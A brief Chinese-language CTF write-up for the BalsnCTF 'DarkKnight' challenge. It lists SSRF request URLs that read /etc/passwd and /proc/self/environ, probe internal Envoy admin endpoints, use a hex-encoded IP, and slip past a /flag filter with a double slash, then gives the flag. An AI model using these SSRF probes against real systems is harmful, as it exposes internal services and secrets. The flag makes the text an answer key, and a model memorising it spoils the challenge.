# DarkKnight
## 題目

![]()

## 解題
進來看到這個
![]()

試著 http://proxy.balsnctf.com/query?site=http://www.google.com
![]()

試著 ssrf  http://proxy.balsnctf.com/query?site=file:///etc/passwd
![]()

試著 http://proxy.balsnctf.com/query?site=file:///proc/self/environ
![]()

試著 http://proxy.balsnctf.com/query?site=file:///proc/net/tcp
![]()

試著 http://proxy.balsnctf.com/query?site=http://127.0.0.1:15000
![]()

試著 http://proxy.balsnctf.com/query?site=http://127.0.0.1:15000/stats
![]()

試著 http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307
![]()

試著 http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307/flag

炸
![]()

試著 http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307//flag

過
![]()

## flag
BALSN{default_istio_service_mesh_envoy_configurations}